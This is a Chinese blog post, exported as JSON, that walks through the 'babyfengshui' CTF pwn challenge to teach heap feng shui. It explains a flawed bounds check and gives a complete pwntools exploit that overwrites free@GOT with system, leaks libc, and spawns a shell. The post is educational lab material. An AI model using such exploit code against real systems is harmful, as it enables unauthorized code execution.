{"title":"堆风水与堆排布","uid":"f86621641a641a4d6db180a8f81d528f","slug":"堆风水与堆排布","date":"2022-01-14T01:50:00.000Z","updated":"2022-01-14T14:11:01.408Z","comments":true,"path":"api/articles/堆风水与堆排布.json","keywords":null,"cover":"https://s2.loli.net/2022/01/14/nzTZPVIb1c3B8WO.jpg","content":"<h1 id=\"介绍\"><a href=\"#介绍\" class=\"headerlink\" title=\"介绍\"></a>介绍</h1><p>所谓堆风水也叫作堆排布，其实说严格了并不是一种漏洞的利用方法，而是一种灵活布置堆块来控制堆布局的方法，在一些其他漏洞的利用中起到效果。接下来拿由清华蓝莲花战队出的babyfengshui来讲一下。</p>\n<h1 id=\"babyfengshui\"><a href=\"#babyfengshui\" class=\"headerlink\" title=\"babyfengshui\"></a>babyfengshui</h1><h2 id=\"分析\"><a href=\"#分析\" class=\"headerlink\" title=\"分析\"></a>分析</h2><p>检查一下保护机制，32位，没有开pie保护</p>\n<p><img src=\"https://s2.loli.net/2022/01/14/lbd6t3wJpcQGhXK.png\" alt=\"image.png\"></p>\n<p>接下来就是静态分析，功能包括增删改查</p>\n<p><img src=\"https://s2.loli.net/2022/01/14/IkdKWA659LOcsfq.png\" alt=\"image.png\"></p>\n<p>其中在add里面，每次申请都会出现两个堆块</p>\n<p><img src=\"https://s2.loli.net/2022/01/14/rDWoRFf1P8uQeM5.png\" alt=\"image.png\"></p>\n<h2 id=\"漏洞\"><a href=\"#漏洞\" class=\"headerlink\" title=\"漏洞\"></a>漏洞</h2><p>继续看update函数，这里有个判断，如果要输入的大小加上description的地址大于等于name堆块的地址就报错<img src=\"https://s2.loli.net/2022/01/14/aSvi76RprAOZe8D.png\" alt=\"image.png\"></p>\n<p>用图来解释，就是输入的description或者修改的description的长度不能达到图中红线处<img src=\"https://s2.loli.net/2022/01/14/cVwFLvJ9OPGfBx3.png\" alt=\"image.png\"></p>\n<p>初看起来没什么毛病，但是如果这两个堆块没有连续，就会造成两个堆块中间可以随意修改</p>\n<p><img src=\"https://s2.loli.net/2022/01/14/Uw3AGr2eguMs1qY.png\" alt=\"image.png\"></p>\n<p>如果不连续，同时中间是一个chunk，就会导致中间的chunk可以被随意修改</p>\n<p>造成这两个堆块不连续所利用的方法就是堆风水，通过灵活布置堆块来控制堆布局，接下来讲解如何将两个堆块分开</p>\n<p>首先申请三个0x80大小的堆块</p>\n<p><img src=\"https://s2.loli.net/2022/01/14/RdukoWqFS19c87E.png\" alt=\"image.png\"></p>\n<p>接下来删除堆块0，再申请一个堆块大小大于0x80小于0x108的堆块，这里我申请了0x100大小的堆块</p>\n<p><img src=\"https://s2.loli.net/2022/01/14/gkBLui2Zo9bAxIQ.png\" alt=\"image.png\"></p>\n<p>因为再次申请时程序会优先考虑bin中的堆块，而此时，bin中的堆块大小满足description堆块的大小而不满足description堆块加上name堆块的大小，所以就会导致description和name分开，这样我们就可以对中间4个堆块随意修改</p>\n<h2 id=\"利用\"><a href=\"#利用\" class=\"headerlink\" title=\"利用\"></a>利用</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">payload=<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x108</span>+<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x8</span>+<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x80</span>+<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x8</span>+p32(free_got)</span><br></pre></td></tr></table></figure>\n\n<p>‘a’*0x108：填满刚刚申请的堆块</p>\n<p>‘a’*0x8+’a’*0x80：填充堆块1的description</p>\n<p>‘a’*0x8+p32(free_got)：将堆块1的name中指向堆块1的description地址改成free_got</p>\n<p>接下来就是泄露free_got的地址，计算libcbase</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">update(<span class=\"number\">3</span>,<span class=\"number\">0x200</span>,payload)</span><br><span class=\"line\">show(<span class=\"number\">1</span>)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&quot;description: &quot;</span>)</span><br><span class=\"line\">free_addr=u32(p.recv(<span class=\"number\">4</span>))</span><br><span class=\"line\">libc=LibcSearcher(<span class=\"string\">&quot;free&quot;</span>,free_addr)</span><br><span class=\"line\">libc_base=free_addr-libc.dump(<span class=\"string\">&quot;free&quot;</span>)</span><br><span class=\"line\">system_addr=libc_base+libc.dump(<span class=\"string\">&quot;system&quot;</span>)</span><br></pre></td></tr></table></figure>\n\n<p>之后修改free函数为system函数，之后free堆块2，堆块2中包含/bin/sh字符串，从而拿到shell</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">update(<span class=\"number\">1</span>,<span class=\"number\">0x4</span>,p32(system_addr))</span><br><span class=\"line\">delete(<span class=\"number\">2</span>)</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"EXP\"><a href=\"#EXP\" class=\"headerlink\" title=\"EXP\"></a>EXP</h1><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> LibcSearcher <span class=\"keyword\">import</span> LibcSearcher</span><br><span class=\"line\">context.log_level=<span class=\"string\">&#x27;debug&#x27;</span></span><br><span class=\"line\"><span class=\"comment\">#p=remote(&quot;node3.buuoj.cn&quot;,27725)</span></span><br><span class=\"line\">p=process(<span class=\"string\">&#x27;./babyfengshui&#x27;</span>)</span><br><span class=\"line\">elf=ELF(<span class=\"string\">&#x27;./babyfengshui&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">free_got=elf.got[<span class=\"string\">&#x27;free&#x27;</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">add</span>(<span class=\"params\">size,name,length,text</span>):</span></span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&quot;Action: &quot;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">&quot;0&quot;</span>)</span><br><span class=\"line\">\tp.sendlineafter(<span class=\"string\">&quot;size of description: &quot;</span>,<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">\tp.sendlineafter(<span class=\"string\">&quot;name: &quot;</span>,name)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&quot;text length:&quot;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"built_in\">str</span>(length))</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&quot;text:&quot;</span>)</span><br><span class=\"line\">\tp.sendline(text)</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">delete</span>(<span class=\"params\">index</span>):</span></span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&quot;Action: &quot;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">&quot;1&quot;</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&quot;index: &quot;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"built_in\">str</span>(index))</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">show</span>(<span class=\"params\">index</span>):</span></span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&quot;Action: &quot;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">&quot;2&quot;</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&quot;index: &quot;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"built_in\">str</span>(index))</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">update</span>(<span class=\"params\">index,length,text</span>):</span></span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&quot;Action: &quot;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">&quot;3&quot;</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&quot;index: &quot;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"built_in\">str</span>(index))</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&quot;text length: &quot;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"built_in\">str</span>(length))</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&quot;text: &quot;</span>)</span><br><span class=\"line\">\tp.sendline(text)</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x80</span>,<span class=\"string\">&quot;nam0&quot;</span>,<span class=\"number\">0x80</span>,<span class=\"string\">&quot;aaaa&quot;</span>)<span class=\"comment\">#0</span></span><br><span class=\"line\">add(<span class=\"number\">0x80</span>,<span class=\"string\">&quot;nam1&quot;</span>,<span class=\"number\">0x80</span>,<span class=\"string\">&quot;bbbb&quot;</span>)<span class=\"comment\">#1</span></span><br><span class=\"line\">add(<span class=\"number\">0x80</span>,<span class=\"string\">&quot;nam2&quot;</span>,<span class=\"number\">0x80</span>,<span class=\"string\">&quot;/bin/sh\\x00&quot;</span>)<span class=\"comment\">#2</span></span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(p)</span></span><br><span class=\"line\">delete(<span class=\"number\">0</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x100</span>,<span class=\"string\">&#x27;nam3&#x27;</span>,<span class=\"number\">0x100</span>,<span class=\"string\">&quot;cccc&quot;</span>)<span class=\"comment\">#3</span></span><br><span class=\"line\">gdb.attach(p)</span><br><span class=\"line\">payload=<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x108</span>+<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x8</span>+<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x80</span>+<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x8</span>+p32(free_got)<span class=\"comment\">#0x108-&gt;0:des+name,0x8+0x80-&gt;1:desp</span></span><br><span class=\"line\">update(<span class=\"number\">3</span>,<span class=\"number\">0x200</span>,payload)</span><br><span class=\"line\">show(<span class=\"number\">1</span>)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&quot;description: &quot;</span>)</span><br><span class=\"line\">free_addr=u32(p.recv(<span class=\"number\">4</span>))</span><br><span class=\"line\">libc=LibcSearcher(<span class=\"string\">&quot;free&quot;</span>,free_addr)</span><br><span class=\"line\">libc_base=free_addr-libc.dump(<span class=\"string\">&quot;free&quot;</span>)</span><br><span class=\"line\">system_addr=libc_base+libc.dump(<span class=\"string\">&quot;system&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">update(<span class=\"number\">1</span>,<span class=\"number\">0x4</span>,p32(system_addr))</span><br><span class=\"line\">delete(<span class=\"number\">2</span>)</span><br><span class=\"line\">p.interactive()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n","feature":true,"text":"介绍所谓堆风水也叫作堆排布，其实说严格了并不是一种漏洞的利用方法，而是一种灵活布置堆块来控制堆布局的方法，在一些其他漏洞的利用中起到效果。接下来拿由清华蓝莲花战队出的babyfengshui来讲一下。 babyfengshui分析检查一下保护机制，32位，没有开pie保护 接下来...","link":"","photos":[],"count_time":{"symbolsCount":"3.1k","symbolsTime":"3 mins."},"categories":[{"name":"pwn","slug":"pwn","count":4,"path":"api/categories/pwn.json"}],"tags":[{"name":"笔记","slug":"笔记","count":4,"path":"api/tags/笔记.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E4%BB%8B%E7%BB%8D\"><span class=\"toc-text\">介绍</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#babyfengshui\"><span class=\"toc-text\">babyfengshui</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%88%86%E6%9E%90\"><span class=\"toc-text\">分析</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%BC%8F%E6%B4%9E\"><span class=\"toc-text\">漏洞</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%88%A9%E7%94%A8\"><span class=\"toc-text\">利用</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#EXP\"><span class=\"toc-text\">EXP</span></a></li></ol>","author":{"name":"Krito","slug":"blog-author","avatar":"https://i.loli.net/2021/05/05/GFiJQZM1pxK3AyC.jpg","link":"/","description":"不要等待，时机永远不会恰到好处。","socials":{"github":"https://github.com/Eli0t-g","twitter":"https://twitter.com/home","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"https://www.zhihu.com/people/wu-sheng-85-17-66","csdn":"https://blog.csdn.net/qq_52053150?spm=1000.2115.3001.5343","juejin":"","customs":{}}},"mapped":true,"prev_post":{},"next_post":{"title":"绕过canary的六种方法","uid":"3c52b98d7c3f3c00c8108b428bc990ce","slug":"绕过canary的方法","date":"2021-12-29T12:49:23.000Z","updated":"2021-12-29T10:29:56.048Z","comments":true,"path":"api/articles/绕过canary的方法.json","keywords":null,"cover":"https://s2.loli.net/2021/12/29/hg8E94WFwYpo1RD.jpg","text":"文章首发于安全客 简介canary保护又称金丝雀保护，作用是为了防止栈溢出的一种保护机制。工作原理是从fs/gs寄存器取值放在rbp-4或者rbp-8的位置（32位/64位），当用户输入结束后，程序会从rbp-4或者rbp-8的位置取出并与fs/gs寄存器对应位置的值进行比较，如...","link":"","photos":[],"count_time":{"symbolsCount":"8.4k","symbolsTime":"8 mins."},"categories":[{"name":"pwn","slug":"pwn","count":4,"path":"api/categories/pwn.json"}],"tags":[{"name":"笔记","slug":"笔记","count":4,"path":"api/tags/笔记.json"}],"author":{"name":"Krito","slug":"blog-author","avatar":"https://i.loli.net/2021/05/05/GFiJQZM1pxK3AyC.jpg","link":"/","description":"不要等待，时机永远不会恰到好处。","socials":{"github":"https://github.com/Eli0t-g","twitter":"https://twitter.com/home","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"https://www.zhihu.com/people/wu-sheng-85-17-66","csdn":"https://blog.csdn.net/qq_52053150?spm=1000.2115.3001.5343","juejin":"","customs":{}}},"feature":true}}